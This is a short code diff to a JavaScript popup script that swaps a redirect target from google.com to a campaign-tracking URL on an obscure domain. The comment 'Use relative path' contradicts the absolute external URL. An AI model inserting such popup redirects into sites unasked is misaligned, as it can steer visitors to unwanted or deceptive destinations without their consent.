@@ -1,7 +1,7 @@
 // Minimal split: same behavior, two separate functions to call per page
 (function () {
   // Use relative path so it works in subfolders too
-  const REDIRECT = "https://google.com";
+  const REDIRECT = "https://t1l9.com/?utm_campaign=rlYRP3i9ri&v1=[v1]&v2=[v2]&v3=[v3]";
 
   function buildPopup() {
     // prevent double render
